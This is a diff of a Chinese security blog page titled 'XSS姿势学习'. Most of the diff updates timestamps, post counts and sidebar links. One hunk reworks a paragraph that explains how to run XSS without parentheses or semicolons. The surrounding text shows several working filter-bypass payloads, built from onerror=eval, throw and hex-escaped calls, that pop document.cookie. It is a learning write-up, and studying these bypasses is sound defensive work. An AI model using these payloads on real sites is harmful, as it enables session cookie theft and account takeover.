@@ -97,7 +97,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png">
 <meta property="og:image" content="https://i.loli.net/2019/06/17/5d078da09539397951.png">
 <meta property="og:image" content="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png">
-<meta property="og:updated_time" content="2019-06-17T13:28:40.085Z">
+<meta property="og:updated_time" content="2019-06-18T11:14:01.428Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS姿势学习">
 <meta name="twitter:description" content="0x00 前言前段时间看到了无需括号和分号的XSS,最近又看了利用JavaScript全局变量绕过XSS过滤器,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。 0x01 无需括号和分号的XSS早在几年前，作者就提到过在javascript中调用函数而无需括号的方法&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;">
@@ -453,7 +453,8 @@
         <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间看到了<a href="https://nosec.org/home/detail/2654.html" target="_blank" rel="noopener">无需括号和分号的XSS</a>,最近又看了<a href="https://www.anquanke.com/post/id/180187" target="_blank" rel="noopener">利用JavaScript全局变量绕过XSS过滤器</a>,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。</p>
 <h2 id="0x01-无需括号和分号的XSS"><a href="#0x01-无需括号和分号的XSS" class="headerlink" title="0x01 无需括号和分号的XSS"></a>0x01 无需括号和分号的XSS</h2><p>早在几年前，作者就提到过在javascript中调用函数而无需括号的方法<br><code>&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</code><br>该方法主要利用<code>onerror</code>和<code>throw</code>,工作原理是将onerror设置为你想调用的函数，然后用throw语句将参数传递给调用函数。在上面的payload中，因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。而语句隔离也可以使用花括号<code>{}</code>来实现:<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code><br>这样其实就已经达到作者标题所要的无需括号和分号的xss。<br>但是作者并没有停止，很快又提出了一万种姿势。<br>他发现<code>throw</code>语句可以接上一些表达式，那么这样就可以把<code>onerror</code>放在<code>throw</code>语句中进行赋值，并且throw表达式的<code>最后一部分</code>会被发送到onerror指定的处理函数中。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,a=<span class="string">'boogle'</span>,b=<span class="string">'1337'</span>,a</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png" alt></p>
-<p>如果想执行更复杂的语句，那么便可以使用<code>eval</code>函数，但是将上面的payload改为<br><code>&lt;script&gt;throw onerror=eval,alert</code>xss<code>&lt;/script&gt;</code><br>这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>如果想执行更复杂的语句，那么便可以使用<code>eval</code>函数，但是将上面的payload改为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert<span class="string">`xss`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>这种方式调用函数，那么显然还是需要<code>()</code>的。但是仔细观察前面的弹窗，我们传入内容为<code>boogle</code>,弹窗内容却为<code>Uncaught boogle</code><br>这样如果在传入的内容之前添加一个<code>=</code>,将会产生一个什么样的效果。<br>对，神奇的事情发生了，就像表面添加<code>=</code>一样，可以将<code>Uncaught</code>赋值为后面的内容，成为一个变量，那么这个变量就可以传入<code>eval</code>函数执行任意javascript代码了。<br>下面的payload中因为alert函数被引号包裹，可以将<code>()</code>编码为<code>\x28\x29</code>从而达到绕过效果。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span>%<span class="number">20</span>onerror=<span class="built_in">eval</span>,<span class="string">"=alert\x28document.cookie\x29"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://i.loli.net/2019/06/17/5d077bc55e02d71577.png" alt><br>同样，前面的payload也可以这样变种,产生的效果及原理相同.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span><span class="string">'=alert\x281337\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>上面将<code>Uncaught</code>变为变量的方法是在<code>chrome</code>浏览器下实现的，而且在<code>Microsoft Edge</code>和<code>IE</code>下都能达到效果。但是当把这种方法拿到<code>firefox</code>浏览器时，却失败了，原因Firefox种报错前缀是<code>uncaught exception:</code>，代码最后执行赋值时会出现语法错误。<br><img src="https://i.loli.net/2019/06/17/5d077f0e2616657672.png" alt></p>
@@ -489,7 +490,7 @@
   <p><span>本文标题:</span><a href="/XSS姿势学习/">XSS姿势学习</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
   <p><span>发布时间:</span>2019年06月17日 - 21:24</p>
-  <p><span>最后更新:</span>2019年06月17日 - 21:28</p>
+  <p><span>最后更新:</span>2019年06月18日 - 19:14</p>
   <p><span>原始链接:</span><a href="/XSS姿势学习/" title="XSS姿势学习">https://zhengbao.wang/XSS姿势学习/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/XSS姿势学习/" aria-label="复制成功！"></i></span>
   </p>
@@ -573,6 +574,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/Linux-run-fsck-failed问题解决办法/" rel="prev" title="Linux run fsck failed问题解决办法">
+                Linux run fsck failed问题解决办法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -653,7 +658,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-count">58</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -675,7 +680,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -728,6 +733,10 @@
         
         
           <li>
+            <a href="/Linux-run-fsck-failed问题解决办法/" title="Linux run fsck failed问题解决办法" target="_blank">Linux run fsck failed问题解决办法</a>
+          </li>
+        
+          <li>
             <a href="/XSS姿势学习/" title="XSS姿势学习" target="_blank">XSS姿势学习</a>
           </li>
         
@@ -741,10 +750,6 @@
         
           <li>
             <a href="/文件上传功能的一些另类利用/" title="文件上传功能的一些另类利用" target="_blank">文件上传功能的一些另类利用</a>
-          </li>
-        
-          <li>
-            <a href="/java代码审计入门之s2-002复现分析/" title="java代码审计入门之s2-002复现分析" target="_blank">java代码审计入门之s2-002复现分析</a>
           </li>
         
       </ul>
@@ -808,7 +813,7 @@
     
       <span class="post-meta-item-text">全站总计字数&#58;</span>
     
-    <span title="全站总计字数">51.7k</span>
+    <span title="全站总计字数">51.9k</span>
   
 </div>
 
